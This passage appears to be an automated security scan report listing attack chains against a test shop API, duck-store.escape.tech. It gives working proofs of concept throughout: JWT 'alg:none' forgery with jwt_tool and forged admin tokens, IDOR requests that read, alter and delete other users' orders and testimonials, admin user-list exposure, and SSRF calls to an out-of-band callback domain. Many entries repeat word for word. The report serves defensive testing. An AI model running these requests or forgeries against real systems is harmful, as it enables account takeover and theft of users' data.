  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://duck-store.escape.tech/api/v1/uploads/import-from-url · PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Chain: internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — GET https://duck-store.escape.tech/api/v1/uploads/fetch-url · PoC: `Request:
GET https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/ssrf",
  "status_code": 200,
  "content_type": "text/html; charset=utf-8",
  "content_length": 72,
  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
}

The OOB callback at oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in was triggered, confirming the server made an outbound request to the attacker-controlled domain.`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
